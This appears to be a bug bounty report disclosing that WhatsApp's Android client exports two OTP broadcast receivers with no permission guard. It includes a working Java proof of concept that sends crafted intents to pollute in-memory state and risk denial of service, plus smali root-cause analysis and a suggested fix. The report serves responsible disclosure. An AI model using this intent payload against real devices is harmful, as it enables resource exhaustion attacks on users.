# HackerOne Report: Exported OTP Receivers Allow State Pollution / DoS by Any Installed App

## Title
Exported broadcast receivers `OtpRequestedReceiver` and `OtpIdentityHashRequestedReceiver` lack permission guards, allowing unauthorized state pollution and resource consumption

## Summary
WhatsApp's Android client exports two broadcast receivers related to OTP verification handshakes without protecting them with any custom or signature-level `android:permission` attribute:
* `com.whatsapp.otpmessage.otp.OtpRequestedReceiver` (listens to `com.whatsapp.otp.OTP_REQUESTED`)
* `com.whatsapp.otpmessage.otp.OtpIdentityHashRequestedReceiver`

Any malicious application installed on the same device can send custom intents to these receivers. Upon receipt, WhatsApp extracts the caller's identity via a `PendingIntent` extra, generates a random UUID token, and stores it in an in-memory ConcurrentHashMap singleton (`LX/Byt;->A00`) prior to validating whether the package is authorized or if the feature flag `0x19d9` is enabled. This allows third-party apps to pollute WhatsApp's state and potentially exhaust memory or trigger DoS.

## Severity
Medium (State Pollution / Memory Allocation Exhaustion)

---

## Steps to Reproduce
1. Build and compile a third-party application targeting a package name like `com.exploit.otpexploit`.
2. Construct an intent targeted to the receiver, wrapping a dummy `PendingIntent` in the `_ci_` extra, along with a random `request_id` (UUID format):
```java
Intent emptyIntent = new Intent();
PendingIntent pendingIntent = PendingIntent.getBroadcast(
    context, 0, emptyIntent, PendingIntent.FLAG_IMMUTABLE
);

Intent exploitIntent = new Intent();
exploitIntent.setClassName(
    "com.whatsapp",
    "com.whatsapp.otpmessage.otp.OtpRequestedReceiver"
);
exploitIntent.putExtra("_ci_", pendingIntent);
exploitIntent.putExtra("request_id", UUID.randomUUID().toString());
exploitIntent.putExtra("SDK_VERSION", "1.0-exploit");

context.sendBroadcast(exploitIntent);
```
3. Deliver this broadcast. 
4. Check WhatsApp's process logs. You will observe WhatsApp wakes up and processes the handshake request:
```
ActivityManager: sync unfroze <PID> com.whatsapp for 3
```

---

## Root Cause Analysis
In `OtpRequestedReceiver.smali`, the broadcast is processed at `A06()`:
1. It retrieves the `PendingIntent` extra from `_ci_` (line 151).
2. It obtains the package name using `getCreatorPackage()` (line 167).
3. It generates an OTP token:
```smali
invoke-static {}, LX/1os;->A0e()Ljava/lang/String; # Generates UUID.randomUUID()
```
4. It inserts this token into the singleton map before performing any whitelist or flag validation:
```smali
iget-object v0, v7, LX/Byt;->A00:Ljava/util/Map;
invoke-interface {v0, v4, v8}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
```
5. Whitelist check and remote config flag `0x19d9` are checked later, only to decide whether to broadcast `com.whatsapp.otp.OTP_HANDSHAKE_CONFIRMATION` back to the sender. The state changes are already persisted in memory.

---

## Impact
1. **State Pollution:** Attacker can flood WhatsApp's in-memory storage with fake package names and generated UUIDs.
2. **Resource Consumption / DoS:** Since there is no rate-limiting or permission guard, an attacker can continuously send broadcasts to allocate objects in memory, potentially forcing memory pressure or crashing the background service.

---

## Suggested Fix
Restrict access to the broadcast receivers in `AndroidManifest.xml` by declaring them non-exported (`android:exported="false"`) unless they absolutely must be called by external apps. If external access is necessary, protect them with a custom signature-level permission or validate caller packages before allocating/storing the generated tokens.
